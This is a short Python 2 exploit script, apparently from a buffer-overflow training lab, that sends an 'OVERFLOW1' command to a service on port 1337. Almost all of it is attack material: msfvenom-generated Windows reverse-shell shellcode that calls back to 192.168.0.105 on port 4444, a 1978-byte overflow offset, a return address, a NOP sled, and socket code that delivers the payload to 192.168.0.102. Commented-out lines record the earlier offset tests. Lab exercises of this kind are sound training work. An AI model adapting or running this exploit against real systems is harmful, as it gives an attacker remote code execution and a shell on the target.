import socket
import sys
from time import sleep

#msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c
shellcode = (
"\xb8\xae\xf7\x1f\xda\xd9\xcf\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\xed\xf9\xfd\x2f\x0d\xed\x80"
"\xd0\xed\xee\xe4\x59\x08\xdf\x24\x3d\x59\x70\x95\x35\x0f\x7d"
"\x5e\x1b\xbb\xf6\x12\xb4\xcc\xbf\x99\xe2\xe3\x40\xb1\xd7\x62"
"\xc3\xc8\x0b\x44\xfa\x02\x5e\x85\x3b\x7e\x93\xd7\x94\xf4\x06"
"\xc7\x91\x41\x9b\x6c\xe9\x44\x9b\x91\xba\x67\x8a\x04\xb0\x31"
"\x0c\xa7\x15\x4a\x05\xbf\x7a\x77\xdf\x34\x48\x03\xde\x9c\x80"
"\xec\x4d\xe1\x2c\x1f\x8f\x26\x8a\xc0\xfa\x5e\xe8\x7d\xfd\xa5"
"\x92\x59\x88\x3d\x34\x29\x2a\x99\xc4\xfe\xad\x6a\xca\x4b\xb9"
"\x34\xcf\x4a\x6e\x4f\xeb\xc7\x91\x9f\x7d\x93\xb5\x3b\x25\x47"
"\xd7\x1a\x83\x26\xe8\x7c\x6c\x96\x4c\xf7\x81\xc3\xfc\x5a\xce"
"\x20\xcd\x64\x0e\x2f\x46\x17\x3c\xf0\xfc\xbf\x0c\x79\xdb\x38"
"\x72\x50\x9b\xd6\x8d\x5b\xdc\xff\x49\x0f\x8c\x97\x78\x30\x47"
"\x67\x84\xe5\xc8\x37\x2a\x56\xa9\xe7\x8a\x06\x41\xed\x04\x78"
"\x71\x0e\xcf\x11\x18\xf5\x98\xdd\x75\xf5\x31\xb6\x87\xf5\xd0"
"\x1a\x01\x13\xb8\xb2\x47\x8c\x55\x2a\xc2\x46\xc7\xb3\xd8\x23"
"\xc7\x38\xef\xd4\x86\xc8\x9a\xc6\x7f\x39\xd1\xb4\xd6\x46\xcf"
"\xd0\xb5\xd5\x94\x20\xb3\xc5\x02\x77\x94\x38\x5b\x1d\x08\x62"
"\xf5\x03\xd1\xf2\x3e\x87\x0e\xc7\xc1\x06\xc2\x73\xe6\x18\x1a"
"\x7b\xa2\x4c\xf2\x2a\x7c\x3a\xb4\x84\xce\x94\x6e\x7a\x99\x70"
"\xf6\xb0\x1a\x06\xf7\x9c\xec\xe6\x46\x49\xa9\x19\x66\x1d\x3d"
"\x62\x9a\xbd\xc2\xb9\x1e\xdd\x20\x6b\x6b\x76\xfd\xfe\xd6\x1b"
"\xfe\xd5\x15\x22\x7d\xdf\xe5\xd1\x9d\xaa\xe0\x9e\x19\x47\x99"
"\x8f\xcf\x67\x0e\xaf\xc5")

buffer = 'A' * 1978 + '\xaf\x11\x50\x62' + "\x90"*50 + shellcode
#buffer = 'A' * 1978 + "BBBB" + "C"*200 	 # 522 - 32 - 351
#buffer = 'A' * 1274 + 'BBBB'  + '\x90' * 30 + shellcode 	 # 522 - 32 - 351

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.0.102',1337))
  s.recv(1024)

  print '[*] Sending buffer'
  s.send("OVERFLOW1 " + buffer)
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()
